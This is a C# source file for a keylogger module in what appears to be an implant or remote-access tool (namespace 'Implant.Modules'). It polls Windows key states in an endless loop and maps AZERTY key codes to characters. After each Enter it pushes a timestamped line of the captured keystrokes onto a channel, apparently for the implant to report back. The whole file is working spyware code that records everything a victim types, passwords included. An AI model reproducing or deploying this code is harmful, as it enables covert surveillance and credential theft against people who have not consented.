using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Channels;

namespace Implant.Modules {
    
    public class Keylogger {
        
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);
        
        [DllImport("user32.dll")]
        public static extern short GetKeyState(Int32 i);

        public static void run(Channel<string> channel) {
            
            StringBuilder res = new StringBuilder();
            
            while (true) {
                var capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                var shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                var shift = capsLock ^ shiftPress;
                var altgr = (GetKeyState(0xA2) & 0x8000) != 0 && (GetKeyState(0xA5) & 0x8000) != 0;
                
                for (int i = 0; i < 255; i++)
                {
                    short key = GetAsyncKeyState(i);
                    if ((key & 1) == 1 || key == -32767) {
                        var keyString = keyValue(i, shift, altgr);
                        if(keyString != "") {
                            res.Append(keyString);
                            Console.Write(keyString);
                        }

                        if (keyString == "[Enter]") {
                            res.Append(keyString);
                            Console.Write("\n");
                            channel.Writer.WriteAsync("[" + DateTime.Now.ToString("dd/MM/yy-HH:mm:ss") + "-Keylogger] " + res);
                            res.Clear();
                        }
                    }
                }
            }
        }
        
        // Was a pain to code, AZERTY only
        private static string keyValue(int code, bool shift, bool altgr)
        {
            if (altgr) {
                if (code == 48) return "@";
                if (code == 50) return "~";
                if (code == 51) return "#";
                if (code == 52) return "{";
                if (code == 53) return "[";
                if (code == 54) return "|";
                if (code == 55) return "`";
                if (code == 56) return "\\";
                if (code == 57) return "^";
                if (code == 219) return "]";
                if (code == 187) return "}";
                if (code == 69) return "€";
                if (code == 186) return "¤";
                
                return "";
            }

            if (shift) {
                if (code == 48) return "0";
                if (code == 49) return "1";
                if (code == 50) return "2";
                if (code == 51) return "3";
                if (code == 52) return "4";
                if (code == 53) return "5";
                if (code == 54) return "6";
                if (code == 55) return "7";
                if (code == 56) return "8";
                if (code == 57) return "9";
                if (code == 219) return "°";
                if (code == 187) return "+";
                
                if (code == 65) return "A";
                if (code == 66) return "B";
                if (code == 67) return "C";
                if (code == 68) return "D";
                if (code == 69) return "E";
                if (code == 70) return "F";
                if (code == 71) return "G";
                if (code == 72) return "H";
                if (code == 73) return "I";
                if (code == 74) return "J";
                if (code == 75) return "K";
                if (code == 76) return "L";
                if (code == 77) return "M";
                if (code == 78) return "N";
                if (code == 79) return "O";
                if (code == 80) return "P";
                if (code == 81) return "Q";
                if (code == 82) return "R";
                if (code == 83) return "S";
                if (code == 84) return "T";
                if (code == 85) return "U";
                if (code == 86) return "V";
                if (code == 87) return "W";
                if (code == 88) return "X";
                if (code == 89) return "Y";
                if (code == 90) return "Z";

                if (code == 221) return "¨";
                if (code == 186) return "£";
                if (code == 192) return "%";
                if (code == 220) return "µ";
                if (code == 188) return "?";
                if (code == 190) return ".";
                if (code == 191) return "/";
                if (code == 223) return "§";

                return "";
            }
            
            if (code == 48) return "à";
            if (code == 49) return "&";
            if (code == 50) return "é";
            if (code == 51) return "\"";
            if (code == 52) return "'";
            if (code == 53) return "(";
            if (code == 54) return "-";
            if (code == 55) return "è";
            if (code == 56) return "_";
            if (code == 57) return "ç";
            if (code == 219) return ")";
            if (code == 187) return "=";
            
            if (code == 65) return "a";
            if (code == 66) return "b";
            if (code == 67) return "c";
            if (code == 68) return "d";
            if (code == 69) return "e";
            if (code == 70) return "f";
            if (code == 71) return "g";
            if (code == 72) return "h";
            if (code == 73) return "i";
            if (code == 74) return "j";
            if (code == 75) return "k";
            if (code == 76) return "l";
            if (code == 77) return "m";
            if (code == 78) return "n";
            if (code == 79) return "o";
            if (code == 80) return "p";
            if (code == 81) return "q";
            if (code == 82) return "r";
            if (code == 83) return "s";
            if (code == 84) return "t";
            if (code == 85) return "u";
            if (code == 86) return "v";
            if (code == 87) return "w";
            if (code == 88) return "x";
            if (code == 89) return "y";
            if (code == 90) return "z";
            
            if (code == 221) return "^";
            if (code == 186) return "$";
            if (code == 192) return "ù";
            if (code == 220) return "*";
            if (code == 188) return ",";
            if (code == 190) return ";";
            if (code == 191) return ":";
            if (code == 223) return "!";
            
            if (code == 91) return "[Windows]";
            if (code == 92) return "[Windows]";
            
            if (code == 96) return "0";
            if (code == 97) return "1";
            if (code == 98) return "2";
            if (code == 99) return "3";
            if (code == 100) return "4";
            if (code == 101) return "5";
            if (code == 102) return "6";
            if (code == 103) return "7";
            if (code == 104) return "8";
            if (code == 105) return "9";
            if (code == 106) return "*";
            if (code == 107) return "+";
            if (code == 109) return "-";
            if (code == 110) return ",";
            if (code == 111) return "/";
            
            if (code == 112) return "[F1]";
            if (code == 113) return "[F2]";
            if (code == 114) return "[F3]";
            if (code == 115) return "[F4]";
            if (code == 116) return "[F5]";
            if (code == 117) return "[F6]";
            if (code == 118) return "[F7]";
            if (code == 119) return "[F8]";
            if (code == 120) return "[F9]";
            if (code == 121) return "[F10]";
            if (code == 122) return "[F11]";
            if (code == 123) return "[F12]";
            
            if (code == 8) return "[Back]";
            if (code == 9) return "[TAB]";
            if (code == 13) return "[Enter]";
            if (code == 27) return "[Esc]";
            if (code == 32) return " ";
            if (code == 91) return "[Windows]";
            if (code == 92) return "[Windows]";
            if (code == 46) return "[Delete]";
            if (code == 37) return "[Left]";
            if (code == 38) return "[Up]";
            if (code == 39) return "[Right]";
            if (code == 40) return "[Down]";
            if (code == 162) return "[Ctrl]";
            if (code == 163) return "[Ctrl]";
            if (code == 164) return "[Alt]";
            if (code == 165) return "[Alt]";
            if (code == 20) return "[Caps Lock]";
            //if (code == 160) return "[Shift]";
            //if (code == 161) return "[Shift]";
            if (code == 222) return "²";

            return "";
        }
    }
}